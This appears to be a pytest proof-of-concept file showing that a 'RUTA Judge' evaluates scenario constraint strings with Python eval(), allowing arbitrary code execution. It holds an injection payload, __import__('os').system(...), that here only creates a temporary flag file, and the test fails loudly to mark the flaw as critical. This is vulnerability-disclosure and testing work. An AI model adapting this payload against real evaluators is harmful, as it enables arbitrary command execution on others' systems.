import os
import pytest
from pathlib import Path
from dataclasses import dataclass, field
from typing import Any, List, Optional, Dict

# Mock the RUTA types to avoid importing the whole world and dealing with complex dependencies
@dataclass
class SeverityPolicy:
    property_failures: Dict[str, str] = field(default_factory=dict)

@dataclass
class Property:
    name: str
    type: str
    constraint: str
    relation: Optional[str] = None

@dataclass
class Expectations:
    must_use_tools: List[str] = field(default_factory=list)
    must_not_use_tools: List[str] = field(default_factory=list)
    properties: List[Property] = field(default_factory=list)

@dataclass
class Scenario:
    id: str
    expectations: Expectations
    severity_policy: SeverityPolicy = field(default_factory=SeverityPolicy)

# Import the Judge (assuming it's importable)
try:
    from llmc.ruta.judge import Judge
except ImportError:
    # If not importable, we might need to adjust pythonpath
    import sys
    sys.path.append(os.getcwd())
    from llmc.ruta.judge import Judge

def test_poc_ruta_rce_via_eval(tmp_path):
    """
    POC: Remote Code Execution via RUTA Judge eval()
    
    The Judge evaluates 'constraint' strings from Scenario objects using Python's eval().
    If an attacker can supply a malicious scenario (e.g. via a shared scenario file),
    they can execute arbitrary code.
    """
    
    # 1. Create a "flag" file that shouldn't exist
    flag_file = tmp_path / "pwned.txt"
    assert not flag_file.exists()
    
    # 2. Create a malicious payload
    # We inject code into the 'constraint' field which is passed to eval()
    # The payload creates the flag file.
    payload = f"__import__('os').system('touch {str(flag_file)}')"
    
    # 3. Construct the malicious Scenario
    malicious_prop = Property(
        name="pwn_property",
        type="metamorphic", # This path triggers the eval in _check_metamorphic -> _check_constraint
        constraint=payload, # This calls eval(prop.constraint, ...)
        relation=None
    )
    
    scenario = Scenario(
        id="attack-scenario",
        expectations=Expectations(properties=[malicious_prop])
    )
    
    # 4. Run the Judge
    # We need a dummy trace file, doesn't matter what's in it as long as it loads
    trace_path = tmp_path / "trace.jsonl"
    trace_path.write_text('{"event": "start", "run_id": "test"}\n')
    
    judge = Judge(scenario, trace_path)
    
    # 5. Trigger evaluation
    # This should execute the payload
    try:
        judge.evaluate()
    except Exception as e:
        # eval might raise an error after executing our side effect, or because the return value isn't a bool
        print(f"Eval raised (expected): {e}")
        pass
        
    # 6. Verify Exploit
    if flag_file.exists():
        print(f"\n[+] PoC Successful: Created {flag_file} via RUTA eval()!")
        pytest.fail("CRITICAL VULNERABILITY: RUTA Judge allows arbitrary code execution via eval()")
    else:
        print("\n[-] PoC Failed: Flag file not created.")

if __name__ == "__main__":
    # Allow running directly
    import sys
    from pathlib import Path
    import tempfile
    
    with tempfile.TemporaryDirectory() as td:
        try:
            test_poc_ruta_rce_via_eval(Path(td))
        except AssertionError as e:
            print(e)